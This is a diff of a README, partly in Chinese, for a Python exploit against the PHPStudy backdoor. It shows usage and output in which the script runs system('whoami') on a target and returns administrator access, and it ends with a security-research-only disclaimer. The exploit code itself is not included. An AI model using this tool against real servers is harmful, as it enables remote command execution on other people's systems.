@@ -1,9 +1,12 @@
 # PHPStudy_BackDoor_Exp
 PHPStudy后门事件 EXP
+
 # 使用方法
 
 ```
 python3 -m pip install requests,choice
+
+
 λ python3 phpstudy_backdoor.py                                                                                              
                                                                                                                             
                                                                                                                             
@@ -33,5 +36,7 @@ system("whoami");
 [+] Command Execute Successful.                                                                                             
 desktop-XXXX\administrator                                                                                               
 ```
+
 # 注意
+
 **仅用于安全研究，请勿用于非法用途！**
